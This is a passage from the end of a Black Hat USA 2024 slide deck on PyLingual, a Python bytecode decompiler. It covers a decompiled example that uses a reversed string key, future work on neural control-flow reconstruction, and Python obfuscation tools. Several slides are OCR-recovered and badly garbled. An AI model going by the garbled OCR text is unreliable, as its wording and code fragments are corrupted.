373 28 BINARY SUBSCR 364 28 BINARY SUBSCR
374 36 POP_BLOCK 365 36 POP BLOCK
375 32 RETURN VALUE 366 32 RETURN VALUE
#BHUSA @BlackHatEvents
```

## Slide 74

# Closing The Loop

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
~ aN % \ 4
‘ ~~ a es S
bisek hat | | wd
—— USA 2024 : a
Closing The Loop
63 if pcs:
SO return eset seems pana [eet
65 return @
63 if pcs:
64 return pces[ ‘snoitcennoCtnerrucnoc’[::-1]]
65 return @
#BHUSA @BlackHatEvents
```

## Slide 75

# Closing The Loop

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
> 5 \ : a ~ naa
black hat
———-< USA 2024
~
ee
ev; 5 PE AS
ase nes E
Closing The Loop
#BHUSA @BlackHatEvents
```

## Slide 76

# Future Directions

=

A blue circle with white textDescription automatically generated

GNN Control Flow Reconstruction

LLM Feedback Loop

Broader Language Support

#BHUSA @BlackHatEvents

## Slide 77

# Future Directions

=

A blue circle with white textDescription automatically generated

GNN Control Flow Reconstruction

LLM Feedback Loop

Broader Language Support

#BHUSA @BlackHatEvents

## Slide 78

# Future Directions

=

GNN Control Flow Reconstruction

LLM Feedback Loop

Broader Language Support

#BHUSA @BlackHatEvents

## Slide 79

# Protecting Your Python

- Bytecode obfuscation

- • Partially compiles to C • Freemium

- Source code obfuscation

- Scrubs variable names

- Free

#BHUSA @BlackHatEvents

## Slide 80

# Key Takeaways

=

= 3.53.6+ Uncompyle6 **PyLingual** Perfect Decompilation

Bytecode Obfuscation

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024 | XN |
Key Takeaways
~ N
oss | B88 = 88
Uncompyle6 PyLingual Perfect Decompilation Bytecode Obfuscation
‘9g Pyarmor
#BHUSA @BlackHatEvents
```
